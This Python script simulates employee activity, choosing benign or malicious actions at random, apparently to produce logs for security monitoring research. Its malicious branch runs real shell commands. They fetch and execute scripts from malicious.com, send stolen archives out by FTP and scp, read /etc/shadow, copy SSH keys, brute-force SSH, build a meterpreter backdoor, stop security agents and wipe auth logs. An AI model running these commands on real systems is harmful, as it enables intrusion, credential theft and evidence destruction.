import json
import random
import time
import os
import requests
import smtplib
from ftplib import FTP
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import subprocess
import mysql.connector
import sys
import numpy as np
import pandas as pd

# Load data from JSON files
with open('/mnt/data/employees.json') as f:
    employees = json.load(f)

with open('/mnt/data/credentials.json') as f:
    credentials = json.load(f)

with open('/mnt/data/internal_emails.json') as f:
    internal_emails = json.load(f)

with open('/mnt/data/external_emails.json') as f:
    external_emails = json.load(f)

with open('/mnt/data/applications.json') as f:
    applications = json.load(f)

# Load malicious_phish.csv
phish_data = pd.read_csv('/mnt/data/datasets/malicious_phish.csv')

# Helper functions to simulate activities
def execute_command(command):
    subprocess.run(command, shell=True)

def log_activity(activity, detail):
    subprocess.run(['logger', f'{activity} - {detail}'])

def upload_stolen_data():
    with FTP('ftp_server') as ftp:
        ftp.login(user='ftpuser', passwd='ftppass')
        with open('/usr/src/app/files/stolen_data.zip', 'rb') as f:
            ftp.storbinary('STOR stolen_data.zip', f)
    log_activity("File Upload", "Uploaded stolen_data.zip to FTP server")

def download_malware():
    response = requests.get("http://malicious.com/malware.exe")
    with open("malware.exe", "wb") as f:
        f.write(response.content)
    execute_command("chmod +x malware.exe && ./malware.exe")
    log_activity("File Download", "Downloaded and executed malware.exe")

def unauthorized_access():
    execute_command("cat /etc/shadow")
    log_activity("Unauthorized Access", "Accessed /etc/shadow")

def privilege_escalation():
    execute_command("sudo ls /root")
    log_activity("Privilege Escalation", "Attempted to access /root")

def steal_credentials():
    execute_command("cp ~/.ssh/id_rsa /usr/src/app/files/stolen_id_rsa")
    log_activity("Credential Stealing", "Copied SSH keys to stolen_id_rsa")

def brute_force_attack():
    execute_command("hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://localhost")
    log_activity("Brute Force Attack", "Performed SSH brute force attack")

def run_sql_query():
    try:
        connection = mysql.connector.connect(
            host='mysql',
            user='root',
            password='password',
            database='testdb'
        )
        cursor = connection.cursor()
        cursor.execute('SELECT NOW()')
        result = cursor.fetchone()
        log_activity("SQL Query", f"Executed SQL query: SELECT NOW(), result: {result}")
    except mysql.connector.Error as err:
        log_activity("SQL Query", f"Failed to execute SQL query: {err}")
    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()

def interact_with_node_js_app():
    try:
        response = requests.get('http://node-app:3000')
        log_activity("Node.js Interaction", f"Interacted with Node.js app, response: {response.text}")
    except requests.RequestException as err:
        log_activity("Node.js Interaction", f"Failed to interact with Node.js app: {err}")

# List of normal and malicious activities
normal_activities = [
    "login", "logout", "file_create", "file_delete", "file_modify", "file_copy", "file_move",
    "send_email", "receive_email", "open_email_attachment",
    "web_browsing", "download_file", "stream_video",
    "open_application", "close_application", "install_application", "uninstall_application",
    "connect_vpn", "disconnect_vpn", "upload_to_cloud", "download_from_cloud",
    "run_sql_query", "node_js_interaction", "meeting", "idle",
    "check_disk_space", "list_processes", "network_ping", "check_memory_usage",
    "install_package", "uninstall_package", "run_benchmark", "backup_files",
    "restore_files", "create_user", "delete_user", "add_to_group",
    "remove_from_group", "change_password", "check_system_logs", "update_system",
    "upgrade_system", "reboot_system", "shutdown_system", "restart_service",
    "stop_service", "start_service", "check_service_status", "list_open_ports",
    "network_trace", "check_network_connections", "view_system_info", "list_installed_packages",
    "version_check", "install_docker", "uninstall_docker", "run_docker_container",
    "stop_docker_container", "remove_docker_container", "pull_docker_image", "push_docker_image",
    "create_database", "delete_database", "backup_database", "restore_database",
    "create_table", "delete_table", "insert_data", "update_data",
    "delete_data", "query_data", "create_index", "delete_index",
    "monitor_database", "check_database_status", "optimize_database", "repair_database",
    "start_vpn", "stop_vpn", "check_vpn_status", "install_vpn",
    "uninstall_vpn", "connect_to_wifi", "disconnect_from_wifi", "list_wifi_networks",
    "check_wifi_status", "configure_firewall", "enable_firewall", "disable_firewall",
    "check_firewall_status", "add_firewall_rule", "remove_firewall_rule", "list_firewall_rules",
    "test_firewall_rules", "view_firewall_logs", "monitor_network_traffic", "analyze_network_traffic",
    "generate_network_report", "generate_system_report", "generate_security_report", "test_security_policy"
]

malicious_activities = [
    "unauthorized_access", "data_exfiltration", "privilege_escalation",
    "credential_stealing", "malware_installation", "brute_force_attack", "network_scanning",
    "ddos_attack", "sql_injection", "cross_site_scripting", "phishing_attack",
    "install_backdoor", "run_malicious_script", "disable_security_tools", "modify_system_logs",
    "clear_system_logs", "hide_malware", "stealth_network_scanning", "network_sniffing",
    "spoof_network_packets", "tamper_data", "exploit_vulnerability", "download_sensitive_files",
    "upload_malicious_files", "modify_file_permissions", "delete_system_files", "overwrite_system_files",
    "disable_network_security", "bypass_authentication", "create_fake_users", "create_fake_logs"
]

# Statistical approach to determine activity weights
def get_activity_weights(normal_activities, malicious_activities, malicious):
    normal_weights = np.random.normal(1, 0.1, len(normal_activities))
    malicious_weights = np.random.normal(1, 0.1, len(malicious_activities))
    
    if malicious:
        normal_weights *= 0.3
        malicious_weights *= 3
    else:
        normal_weights *= 0.9
        malicious_weights *= 0.1
    
    return np.concatenate((normal_weights, malicious_weights))

# Function to simulate user activities
def simulate_user_activities(username, employee_id, malicious):
    while True:
        # Get activity weights based on user type
        weights = get_activity_weights(normal_activities, malicious_activities, malicious)
        activities = normal_activities + malicious_activities
        
        # Determine activity based on weighted random choice
        activity = random.choices(activities, weights=weights, k=1)[0]

        # Simulate the selected activity
        if activity in normal_activities:
            if activity == "login":
                log_activity("Login", f"{username} logged in")
            elif activity == "logout":
                log_activity("Logout", f"{username} logged out")
            elif activity == "file_create":
                file_name = f"/usr/src/app/files/{username}_file.txt"
                execute_command(f"touch {file_name}")
                log_activity("File Create", f"Created {file_name}")
            elif activity == "file_delete":
                file_name = f"/usr/src/app/files/{username}_file.txt"
                execute_command(f"rm {file_name}")
                log_activity("File Delete", f"Deleted {file_name}")
            elif activity == "file_modify":
                file_name = f"/usr/src/app/files/{username}_file.txt"
                execute_command(f"echo 'Modified content' >> {file_name}")
                log_activity("File Modify", f"Modified {file_name}")
            elif activity == "file_copy":
                src_file = f"/usr/src/app/files/{username}_file.txt"
                dest_file = f"/usr/src/app/files/{username}_file_copy.txt"
                execute_command(f"cp {src_file} {dest_file}")
                log_activity("File Copy", f"Copied {src_file} to {dest_file}")
            elif activity == "file_move":
                src_file = f"/usr/src/app/files/{username}_file_copy.txt"
                dest_file = f"/usr/src/app/files/{username}_file_moved.txt"
                execute_command(f"mv {src_file} {dest_file}")
                log_activity("File Move", f"Moved {src_file} to {dest_file}")
            elif activity == "send_email":
                server = smtplib.SMTP('localhost', 1025)
                recipient = random.choice(internal_emails)
                subject = "Test Email"
                body = "This is a test email."
                message = f"From: {username}@company.com\nTo: {recipient}\nSubject: {subject}\n\n{body}"
                server.sendmail(f"{username}@company.com", recipient, message)
                server.quit()
                log_activity("Send Email", f"Sent email to {recipient}")
            elif activity == "receive_email":
                log_activity("Receive Email", "Received email")
            elif activity == "open_email_attachment":
                log_activity("Open Email Attachment", "Opened email attachment")
            elif activity == "web_browsing":
                options = Options()
                options.headless = True
                browser = webdriver.Firefox(options=options)
                url_data = phish_data.sample()
                url = url_data['url'].values[0]
                url_type = url_data['type'].values[0]
                browser.get(url)
                time.sleep(5)
                browser.quit()
                log_activity("Web Browsing", f"Visited {url} ({url_type})")
            elif activity == "download_file":
                urls = ["https://example.com/file.zip", "https://another-example.com/file.zip"]
                url = random.choice(urls)
                response = requests.get(url)
                file_path = f"/usr/src/app/files/{username}_downloaded_file.zip"
                with open(file_path, "wb") as f:
                    f.write(response.content)
                log_activity("Download File", f"Downloaded file from {url} to {file_path}")
            elif activity == "stream_video":
                log_activity("Stream Video", "Streamed video")
            elif activity == "open_application":
                app = random.choice(applications)
                log_activity("Open Application", f"Opened application {app['name']}")
            elif activity == "close_application":
                app = random.choice(applications)
                log_activity("Close Application", f"Closed application {app['name']}")
            elif activity == "install_application":
                app = random.choice(applications)
                execute_command(f"apt-get install -y {app['name'].lower().replace(' ', '-')}")
                log_activity("Install Application", f"Installed {app['name']}")
            elif activity == "uninstall_application":
                app = random.choice(applications)
                execute_command(f"apt-get remove -y {app['name'].lower().replace(' ', '-')}")
                log_activity("Uninstall Application", f"Uninstalled {app['name']}")
            elif activity == "connect_vpn":
                log_activity("Connect VPN", "Connected to VPN")
            elif activity == "disconnect_vpn":
                log_activity("Disconnect VPN", "Disconnected from VPN")
            elif activity == "upload_to_cloud":
                cloud_services = ["AWS S3", "Google Drive", "Dropbox"]
                service = random.choice(cloud_services)
                log_activity("Upload to Cloud", f"Uploaded data to {service}")
            elif activity == "download_from_cloud":
                cloud_services = ["AWS S3", "Google Drive", "Dropbox"]
                service = random.choice(cloud_services)
                log_activity("Download from Cloud", f"Downloaded data from {service}")
            elif activity == "run_sql_query":
                run_sql_query()
            elif activity == "node_js_interaction":
                interact_with_node_js_app()
            elif activity == "meeting":
                log_activity("Meeting", "Attending a meeting")
            elif activity == "idle":
                log_activity("Idle", "Idle")
            elif activity == "check_disk_space":
                execute_command("df -h")
                log_activity("Check Disk Space", "Checked disk space")
            elif activity == "list_processes":
                execute_command("ps aux")
                log_activity("List Processes", "Listed running processes")
            elif activity == "network_ping":
                execute_command("ping -c 4 google.com")
                log_activity("Network Ping", "Pinged google.com")
            elif activity == "check_memory_usage":
                execute_command("free -m")
                log_activity("Check Memory Usage", "Checked memory usage")
            elif activity == "install_package":
                package = random.choice(["htop", "curl", "vim"])
                execute_command(f"apt-get install -y {package}")
                log_activity("Install Package", f"Installed package {package}")
            elif activity == "uninstall_package":
                package = random.choice(["htop", "curl", "vim"])
                execute_command(f"apt-get remove -y {package}")
                log_activity("Uninstall Package", f"Uninstalled package {package}")
            elif activity == "run_benchmark":
                execute_command("sysbench --test=cpu --cpu-max-prime=20000 run")
                log_activity("Run Benchmark", "Ran CPU benchmark")
            elif activity == "backup_files":
                execute_command("tar -czvf /usr/src/app/files/backup.tar.gz /usr/src/app/files/")
                log_activity("Backup Files", "Backed up files to backup.tar.gz")
            elif activity == "restore_files":
                execute_command("tar -xzvf /usr/src/app/files/backup.tar.gz -C /usr/src/app/files/")
                log_activity("Restore Files", "Restored files from backup.tar.gz")
            elif activity == "create_user":
                new_user = random.choice(["user1", "user2", "user3"])
                execute_command(f"useradd {new_user}")
                log_activity("Create User", f"Created new user {new_user}")
            elif activity == "delete_user":
                user = random.choice(["user1", "user2", "user3"])
                execute_command(f"userdel {user}")
                log_activity("Delete User", f"Deleted user {user}")
            elif activity == "add_to_group":
                user = random.choice(["user1", "user2", "user3"])
                group = random.choice(["sudo", "docker"])
                execute_command(f"usermod -aG {group} {user}")
                log_activity("Add to Group", f"Added user {user} to group {group}")
            elif activity == "remove_from_group":
                user = random.choice(["user1", "user2", "user3"])
                group = random.choice(["sudo", "docker"])
                execute_command(f"deluser {user} {group}")
                log_activity("Remove from Group", f"Removed user {user} from group {group}")
            elif activity == "change_password":
                user = random.choice(["user1", "user2", "user3"])
                execute_command(f"echo '{user}:newpassword' | chpasswd")
                log_activity("Change Password", f"Changed password for user {user}")
            elif activity == "check_system_logs":
                execute_command("cat /var/log/syslog | tail -n 20")
                log_activity("Check System Logs", "Checked system logs")
            elif activity == "update_system":
                execute_command("apt-get update")
                log_activity("Update System", "Updated package list")
            elif activity == "upgrade_system":
                execute_command("apt-get upgrade -y")
                log_activity("Upgrade System", "Upgraded system packages")
            elif activity == "reboot_system":
                log_activity("Reboot System", "Rebooting system")
                execute_command("reboot")
            elif activity == "shutdown_system":
                log_activity("Shutdown System", "Shutting down system")
                execute_command("shutdown now")
            elif activity == "restart_service":
                service = random.choice(["ssh", "nginx", "mysql"])
                execute_command(f"systemctl restart {service}")
                log_activity("Restart Service", f"Restarted service {service}")
            elif activity == "stop_service":
                service = random.choice(["ssh", "nginx", "mysql"])
                execute_command(f"systemctl stop {service}")
                log_activity("Stop Service", f"Stopped service {service}")
            elif activity == "start_service":
                service = random.choice(["ssh", "nginx", "mysql"])
                execute_command(f"systemctl start {service}")
                log_activity("Start Service", f"Started service {service}")
            elif activity == "check_service_status":
                service = random.choice(["ssh", "nginx", "mysql"])
                execute_command(f"systemctl status {service}")
                log_activity("Check Service Status", f"Checked status of service {service}")
            elif activity == "list_open_ports":
                execute_command("netstat -tuln")
                log_activity("List Open Ports", "Listed open ports")
            elif activity == "network_trace":
                execute_command("traceroute google.com")
                log_activity("Network Trace", "Traced route to google.com")
            elif activity == "check_network_connections":
                execute_command("netstat -an")
                log_activity("Check Network Connections", "Checked network connections")
            elif activity == "view_system_info":
                execute_command("uname -a")
                log_activity("View System Info", "Viewed system information")
            elif activity == "list_installed_packages":
                execute_command("dpkg --get-selections")
                log_activity("List Installed Packages", "Listed installed packages")
            elif activity == "version_check":
                execute_command("lsb_release -a")
                log_activity("Version Check", "Checked OS version")
            elif activity == "install_docker":
                execute_command("apt-get install -y docker.io")
                log_activity("Install Docker", "Installed Docker")
            elif activity == "uninstall_docker":
                execute_command("apt-get remove -y docker.io")
                log_activity("Uninstall Docker", "Uninstalled Docker")
            elif activity == "run_docker_container":
                execute_command("docker run hello-world")
                log_activity("Run Docker Container", "Ran Docker container hello-world")
            elif activity == "stop_docker_container":
                container_id = subprocess.check_output("docker ps -q | head -n 1", shell=True).decode().strip()
                execute_command(f"docker stop {container_id}")
                log_activity("Stop Docker Container", f"Stopped Docker container {container_id}")
            elif activity == "remove_docker_container":
                container_id = subprocess.check_output("docker ps -a -q | head -n 1", shell=True).decode().strip()
                execute_command(f"docker rm {container_id}")
                log_activity("Remove Docker Container", f"Removed Docker container {container_id}")
            elif activity == "pull_docker_image":
                image = random.choice(["ubuntu", "nginx", "mysql"])
                execute_command(f"docker pull {image}")
                log_activity("Pull Docker Image", f"Pulled Docker image {image}")
            elif activity == "push_docker_image":
                image = random.choice(["myapp:latest"])
                execute_command(f"docker push {image}")
                log_activity("Push Docker Image", f"Pushed Docker image {image}")
            elif activity == "create_database":
                execute_command("mysql -u root -ppassword -e 'CREATE DATABASE testdb;'")
                log_activity("Create Database", "Created database testdb")
            elif activity == "delete_database":
                execute_command("mysql -u root -ppassword -e 'DROP DATABASE testdb;'")
                log_activity("Delete Database", "Deleted database testdb")
            elif activity == "backup_database":
                execute_command("mysqldump -u root -ppassword testdb > /usr/src/app/files/testdb_backup.sql")
                log_activity("Backup Database", "Backed up database testdb")
            elif activity == "restore_database":
                execute_command("mysql -u root -ppassword testdb < /usr/src/app/files/testdb_backup.sql")
                log_activity("Restore Database", "Restored database testdb")
            elif activity == "create_table":
                execute_command("mysql -u root -ppassword -e 'CREATE TABLE testdb.mytable (id INT);'")
                log_activity("Create Table", "Created table mytable in database testdb")
            elif activity == "delete_table":
                execute_command("mysql -u root -ppassword -e 'DROP TABLE testdb.mytable;'")
                log_activity("Delete Table", "Deleted table mytable in database testdb")
            elif activity == "insert_data":
                execute_command("mysql -u root -ppassword -e 'INSERT INTO testdb.mytable (id) VALUES (1);'")
                log_activity("Insert Data", "Inserted data into table mytable in database testdb")
            elif activity == "update_data":
                execute_command("mysql -u root -ppassword -e 'UPDATE testdb.mytable SET id=2 WHERE id=1;'")
                log_activity("Update Data", "Updated data in table mytable in database testdb")
            elif activity == "delete_data":
                execute_command("mysql -u root -ppassword -e 'DELETE FROM testdb.mytable WHERE id=2;'")
                log_activity("Delete Data", "Deleted data from table mytable in database testdb")
            elif activity == "query_data":
                execute_command("mysql -u root -ppassword -e 'SELECT * FROM testdb.mytable;'")
                log_activity("Query Data", "Queried data from table mytable in database testdb")
            elif activity == "create_index":
                execute_command("mysql -u root -ppassword -e 'CREATE INDEX idx_id ON testdb.mytable (id);'")
                log_activity("Create Index", "Created index on table mytable in database testdb")
            elif activity == "delete_index":
                execute_command("mysql -u root -ppassword -e 'DROP INDEX idx_id ON testdb.mytable;'")
                log_activity("Delete Index", "Deleted index on table mytable in database testdb")
            elif activity == "monitor_database":
                execute_command("mysqladmin -u root -ppassword status")
                log_activity("Monitor Database", "Monitored database status")
            elif activity == "check_database_status":
                execute_command("mysqladmin -u root -ppassword ping")
                log_activity("Check Database Status", "Checked database status")
            elif activity == "optimize_database":
                execute_command("mysqlcheck -u root -ppassword --optimize testdb")
                log_activity("Optimize Database", "Optimized database testdb")
            elif activity == "repair_database":
                execute_command("mysqlcheck -u root -ppassword --repair testdb")
                log_activity("Repair Database", "Repaired database testdb")
            elif activity == "start_vpn":
                execute_command("systemctl start openvpn")
                log_activity("Start VPN", "Started VPN service")
            elif activity == "stop_vpn":
                execute_command("systemctl stop openvpn")
                log_activity("Stop VPN", "Stopped VPN service")
            elif activity == "check_vpn_status":
                execute_command("systemctl status openvpn")
                log_activity("Check VPN Status", "Checked VPN service status")
            elif activity == "install_vpn":
                execute_command("apt-get install -y openvpn")
                log_activity("Install VPN", "Installed OpenVPN")
            elif activity == "uninstall_vpn":
                execute_command("apt-get remove -y openvpn")
                log_activity("Uninstall VPN", "Uninstalled OpenVPN")
            elif activity == "connect_to_wifi":
                execute_command("nmcli d wifi connect SSID password PASSWORD")
                log_activity("Connect to WiFi", "Connected to WiFi network SSID")
            elif activity == "disconnect_from_wifi":
                execute_command("nmcli d disconnect wlan0")
                log_activity("Disconnect from WiFi", "Disconnected from WiFi network")
            elif activity == "list_wifi_networks":
                execute_command("nmcli d wifi list")
                log_activity("List WiFi Networks", "Listed available WiFi networks")
            elif activity == "check_wifi_status":
                execute_command("nmcli d status")
                log_activity("Check WiFi Status", "Checked WiFi status")
            elif activity == "configure_firewall":
                execute_command("ufw allow 22")
                log_activity("Configure Firewall", "Configured firewall to allow SSH")
            elif activity == "enable_firewall":
                execute_command("ufw enable")
                log_activity("Enable Firewall", "Enabled firewall")
            elif activity == "disable_firewall":
                execute_command("ufw disable")
                log_activity("Disable Firewall", "Disabled firewall")
            elif activity == "check_firewall_status":
                execute_command("ufw status")
                log_activity("Check Firewall Status", "Checked firewall status")
            elif activity == "add_firewall_rule":
                port = random.choice([80, 443, 3306])
                execute_command(f"ufw allow {port}")
                log_activity("Add Firewall Rule", f"Added firewall rule to allow port {port}")
            elif activity == "remove_firewall_rule":
                port = random.choice([80, 443, 3306])
                execute_command(f"ufw delete allow {port}")
                log_activity("Remove Firewall Rule", f"Removed firewall rule to allow port {port}")
            elif activity == "list_firewall_rules":
                execute_command("ufw status numbered")
                log_activity("List Firewall Rules", "Listed firewall rules")
            elif activity == "test_firewall_rules":
                execute_command("ufw status verbose")
                log_activity("Test Firewall Rules", "Tested firewall rules")
            elif activity == "view_firewall_logs":
                execute_command("cat /var/log/ufw.log | tail -n 20")
                log_activity("View Firewall Logs", "Viewed firewall logs")
            elif activity == "monitor_network_traffic":
                execute_command("iftop -t -s 10")
                log_activity("Monitor Network Traffic", "Monitored network traffic")
            elif activity == "analyze_network_traffic":
                execute_command("tshark -a duration:10")
                log_activity("Analyze Network Traffic", "Analyzed network traffic")
            elif activity == "generate_network_report":
                log_activity("Generate Network Report", "Generated network report")
            elif activity == "generate_system_report":
                log_activity("Generate System Report", "Generated system report")
            elif activity == "generate_security_report":
                log_activity("Generate Security Report", "Generated security report")
            elif activity == "test_security_policy":
                log_activity("Test Security Policy", "Tested security policy")
        elif activity in malicious_activities:
            if activity == "unauthorized_access":
                unauthorized_access()
            elif activity == "data_exfiltration":
                execute_command("scp /usr/src/app/files/stolen_data.zip user@external-server:/path/to/remote/location")
                log_activity("Data Exfiltration", "Exfiltrated data to external server")
            elif activity == "privilege_escalation":
                privilege_escalation()
            elif activity == "credential_stealing":
                steal_credentials()
            elif activity == "malware_installation":
                download_malware()
            elif activity == "brute_force_attack":
                brute_force_attack()
            elif activity == "network_scanning":
                execute_command("nmap -sP 192.168.1.0/24")
                log_activity("Network Scanning", "Performed network scan")
            elif activity == "ddos_attack":
                execute_command("hping3 -S --flood -V target_ip")
                log_activity("DDoS Attack", "Performed DDoS attack on target_ip")
            elif activity == "sql_injection":
                execute_command("sqlmap -u 'http://target.com/vulnerable' --dbs")
                log_activity("SQL Injection", "Performed SQL injection on target.com")
            elif activity == "cross_site_scripting":
                execute_command("xsser --url 'http://target.com'")
                log_activity("Cross-site Scripting", "Performed XSS on target.com")
            elif activity == "phishing_attack":
                execute_command("setoolkit")
                log_activity("Phishing Attack", "Performed phishing attack")
            elif activity == "install_backdoor":
                execute_command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > backdoor.exe")
                log_activity("Install Backdoor", "Installed backdoor")
            elif activity == "run_malicious_script":
                execute_command("wget http://malicious.com/malicious.sh && chmod +x malicious.sh && ./malicious.sh")
                log_activity("Run Malicious Script", "Ran malicious script from malicious.com")
            elif activity == "disable_security_tools":
                execute_command("systemctl stop wazuh-agent")
                log_activity("Disable Security Tools", "Disabled Wazuh agent")
            elif activity == "modify_system_logs":
                execute_command("echo 'Log entry' >> /var/log/auth.log")
                log_activity("Modify System Logs", "Modified system logs")
            elif activity == "clear_system_logs":
                execute_command("echo '' > /var/log/auth.log")
                log_activity("Clear System Logs", "Cleared system logs")
            elif activity == "hide_malware":
                execute_command("mv malware.exe /usr/src/app/.malware.exe")
                log_activity("Hide Malware", "Hid malware")
            elif activity == "stealth_network_scanning":
                execute_command("nmap -sS -T1 192.168.1.0/24")
                log_activity("Stealth Network Scanning", "Performed stealth network scan")
            elif activity == "network_sniffing":
                execute_command("tcpdump -i eth0 -w /usr/src/app/files/sniffed_traffic.pcap")
                log_activity("Network Sniffing", "Performed network sniffing")
            elif activity == "spoof_network_packets":
                execute_command("arpspoof -i eth0 -t target_ip gateway_ip")
                log_activity("Spoof Network Packets", "Spoofed network packets")
            elif activity == "tamper_data":
                execute_command("echo 'Tampered data' >> /usr/src/app/files/data.txt")
                log_activity("Tamper Data", "Tampered with data in data.txt")
            elif activity == "exploit_vulnerability":
                execute_command("msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 4444; run'")
                log_activity("Exploit Vulnerability", "Exploited vulnerability")
            elif activity == "download_sensitive_files":
                execute_command("wget http://target.com/sensitive_data.zip")
                log_activity("Download Sensitive Files", "Downloaded sensitive files from target.com")
            elif activity == "upload_malicious_files":
                execute_command("scp malware.exe user@target:/path/to/remote/location")
                log_activity("Upload Malicious Files", "Uploaded malicious files to target")
            elif activity == "modify_file_permissions":
                execute_command("chmod 777 /usr/src/app/files/sensitive_file.txt")
                log_activity("Modify File Permissions", "Modified permissions of sensitive_file.txt")
            elif activity == "delete_system_files":
                execute_command("rm -rf /usr/src/app/files/*")
                log_activity("Delete System Files", "Deleted system files")
            elif activity == "overwrite_system_files":
                execute_command("echo 'Overwritten content' > /usr/src/app/files/important_file.txt")
                log_activity("Overwrite System Files", "Overwritten system files")
            elif activity == "disable_network_security":
                execute_command("systemctl stop ufw")
                log_activity("Disable Network Security", "Disabled network security")
            elif activity == "bypass_authentication":
                execute_command("echo 'Bypass authentication' >> /etc/passwd")
                log_activity("Bypass Authentication", "Bypassed authentication")
            elif activity == "create_fake_users":
                execute_command("useradd fakeuser")
                log_activity("Create Fake Users", "Created fake user fakeuser")
            elif activity == "create_fake_logs":
                execute_command("echo 'Fake log entry' >> /var/log/syslog")
                log_activity("Create Fake Logs", "Created fake log entry in syslog")

        # Simulate realistic durations for activities
        time.sleep(random.randint(5, 20))

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 user_activity.py <username> <employee_id> <malicious>")
        sys.exit(1)

    username = sys.argv[1]
    employee_id = sys.argv[2]
    malicious = sys.argv[3].lower() == 'true'

    simulate_user_activities(username, employee_id, malicious)
